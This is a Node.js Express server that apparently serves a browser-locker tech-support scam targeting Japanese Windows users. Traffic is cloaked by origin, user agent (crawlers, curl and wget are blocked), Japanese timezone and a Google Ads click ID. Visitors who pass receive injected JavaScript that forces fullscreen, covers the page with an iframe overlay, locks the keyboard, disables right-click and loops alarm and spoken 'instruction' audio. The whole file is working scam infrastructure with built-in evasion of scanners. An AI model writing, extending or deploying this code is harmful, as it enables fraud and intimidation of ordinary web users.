
import express from "express";
import cors from "cors";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

// === Per-origin asset mapping ===
// Add as many origins as you like; each maps to exactly one asset.
const ORIGIN_ASSETS = {
  "https://seishinyoga-arh0fkd7duceeseq.z01.azurefd.net": {
    htmlFile: "asset1.html",
    //htmlFile: "asset2.html",
    audioUrl: "https://audio.jukehost.co.uk/zO0pp9woxpuf7UjSMiO3T2GxE8Ywo6dT",
    //audioUrl: "https://audio.jukehost.co.uk/DeGqfpMsH4oDXO9MEM2KXWW4RCZunve9",
  },
  "https://sanyoga.life": {
    htmlFile: "asset2.html",
    //audioUrl: "https://audio.jukehost.co.uk/xFyKnj0AAZTbSxkwrdja414nXJmZ6Bmr",
      audioUrl: "https://audio.jukehost.co.uk/jDTBEXiUPm75bqiedOtEYUt6h7ZjHHUj",
  },
};

const ALLOWED_ORIGINS = Object.keys(ORIGIN_ASSETS);

// Helper to resolve relative paths (ESM compatible)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// === CORS (dynamic origin) ===
app.use(
  cors({
    credentials: true,
    origin(origin, cb) {
      // If no Origin header, block by default (tighten as desired)
      if (!origin) return cb(new Error("CORS: Origin required"));
      if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
      return cb(new Error("CORS: Not allowed"));
    },
  })
);

app.use(express.json());

// === Security Middleware ===
function validateRequest(req, res, next) {
  const origin = req.get("origin");

  // 1) Origin must be one of the allowed origins
  if (!ALLOWED_ORIGINS.includes(origin)) {
    return res.status(403).send("FAILED: origin check");
  }

  // Attach the asset chosen for this origin so routes can use it.
  req.asset = ORIGIN_ASSETS[origin];

  // 2) Basic bot / platform checks
  const ua = req.get("user-agent")?.toLowerCase() || "";
  const blockedAgents = ["bot", "spider", "crawler", "curl", "wget"];
  const isWindows = ua.includes("windows");
  if (blockedAgents.some((a) => ua.includes(a)) || !isWindows) {
    return res.status(403).send("FAILED: bot or not Windows");
  }

  // 3) Timezone check
  const timezone = req.get("x-client-timezone");
  if (!["Asia/Tokyo", "Japan", "Etc/GMT-9"].includes(timezone)) {
    return res.status(403).send("FAILED: wrong timezone");
  }

  next();
}

// === HTML Escaping Utility ===
function escapeHTMLForJSString(html) {
  return html
    .replace(/\\/g, "\\\\") // Escape backslashes
    .replace(/'/g, "\\'") // Escape single quotes
    .replace(/\r?\n/g, ""); // Remove newlines
}
// escape for embedding inside a JS string
function escapeForSingleQuotedJS(str) {
  return str
    .replace(/\\/g, "\\\\")
    .replace(/'/g, "\\'")
    .replace(/\r/g, "\\r")
    .replace(/\n/g, "\\n")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}

app.get("/frontend-loader", validateRequest, async (req, res) => {
  const gclid = req.query.gclid;
  if (!gclid || gclid.length < 10) {
    return res.status(403).send("FAILED: gclid missing or too short");
  }

  try {
    const asset = req.asset;
    if (!asset) {
      return res.status(500).json({ error: "No asset mapped for origin" });
    }

    const htmlPath = path.join(__dirname, asset.htmlFile);
    let rawHTML = await fs.readFile(htmlPath, "utf8");

    const srcdoc = escapeForSingleQuotedJS(rawHTML);

    const code = `
      (async () => {
        try { await document.documentElement.requestFullscreen(); } catch(e) {}

        const overlay = document.createElement('div');
        overlay.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:#000;";
        document.body.appendChild(overlay);

        const iframe = document.createElement('iframe');
        iframe.allowFullscreen = true;
        iframe.setAttribute('allow', 'autoplay; clipboard-read; clipboard-write; fullscreen');
        iframe.style.cssText = "width:100%;height:100%;border:0;display:block;background:#000;";
        iframe.srcdoc = '${srcdoc}';
        overlay.appendChild(iframe);

        try { navigator.keyboard && navigator.keyboard.lock(); } catch(e) {}
        document.addEventListener('contextmenu', e => e.preventDefault());

        const beepAudio = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
        beepAudio.loop = true;
        beepAudio.play().catch(()=>{});

        const instructionAudio = new Audio('${escapeForSingleQuotedJS(asset.audioUrl)}');
        instructionAudio.loop = true;
        instructionAudio.play().catch(()=>{});

        document.removeEventListener("click", handleSomeClick);
      })();
    `;

    const requestOrigin = req.get("origin");
    if (requestOrigin) {
      res.set("Access-Control-Allow-Origin", requestOrigin);
    }

    console.log(`Sent iframe srcdoc for: ${asset.htmlFile} (origin: ${requestOrigin})`);
    return res.json({ code });
  } catch (err) {
    console.error("Error in frontend-loader:", err);
    return res.status(500).json({ error: "Failed to generate frontend loader" });
  }
});

// === Route: /frontend-loader ===
// app.get("/frontend-loader", validateRequest, async (req, res) => {
//   const gclid = req.query.gclid;
//   if (!gclid || gclid.length < 10) {
//     return res.status(403).send("FAILED: gclid missing or too short");
//   }

//   console.log(gclid);

//   try {
//     // Asset is selected based on the request Origin (set in validateRequest)
//     const asset = req.asset;
//     if (!asset) {
//       return res.status(500).json({ error: "No asset mapped for origin" });
//     }

//     const htmlPath = path.join(__dirname, asset.htmlFile);
//     const rawHTML = await fs.readFile(htmlPath, "utf8");
//     const safeHTML = escapeHTMLForJSString(rawHTML);

//     const code = `
//       document.documentElement.requestFullscreen().then(() => {
//         document.body.innerHTML = '${safeHTML}';
//         navigator.keyboard.lock();
//         document.addEventListener('contextmenu', e => e.preventDefault());

//         const beepAudio = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
//         beepAudio.loop = true;
//         beepAudio.play();

//         const instructionAudio = new Audio('${asset.audioUrl}');
//         instructionAudio.loop = true;
//         instructionAudio.play();

//         document.removeEventListener("click", handleSomeClick);
//       });
//     `;

//     // Reflect the specific request Origin (required when credentials: true)
//     const requestOrigin = req.get("origin");
//     res.set("Access-Control-Allow-Origin", requestOrigin);

//     console.log(`Sent code for: ${asset.htmlFile} (origin: ${requestOrigin})`);
//     return res.json({ code });
//   } catch (err) {
//     console.error("Error in frontend-loader:", err);
//     return res.status(500).json({ error: "Failed to generate frontend loader" });
//   }
// });

// === Start server ===
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
